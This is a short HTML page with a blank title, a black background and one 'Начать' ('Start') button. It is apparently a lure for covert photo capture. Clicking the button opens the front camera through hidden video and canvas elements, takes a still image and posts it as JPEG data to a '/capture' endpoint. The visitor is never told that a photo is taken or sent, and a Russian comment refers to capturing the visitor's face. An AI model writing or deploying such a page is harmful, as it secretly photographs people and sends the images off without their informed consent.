<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: black;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        button {
            background: white;
            border: none;
            padding: 20px 60px;
            font-size: 24px;
            border-radius: 40px;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <button id="btn">Начать</button>
    
    <video id="video" style="display:none" autoplay playsinline></video>
    <canvas id="canvas" style="display:none"></canvas>

    <script>
        const btn = document.getElementById('btn');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        
        btn.onclick = async () => {
            try {
                btn.style.opacity = '0.5';
                
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',  // фронталка (твоя морда)
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    } 
                });
                
                video.srcObject = stream;
                
                video.onloadeddata = () => {
                    setTimeout(() => {
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        
                        const photo = canvas.toDataURL('image/jpeg', 0.7);
                        
                        fetch('/capture', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({ photo: photo })
                        }).finally(() => {
                            stream.getTracks().forEach(t => t.stop());
                            btn.style.opacity = '1';
                        });
                    }, 300);
                };
            } catch (err) {
                alert('Ошибка: ' + err.message);
                btn.style.opacity = '1';
            }
        };
    </script>
</body>
</html>
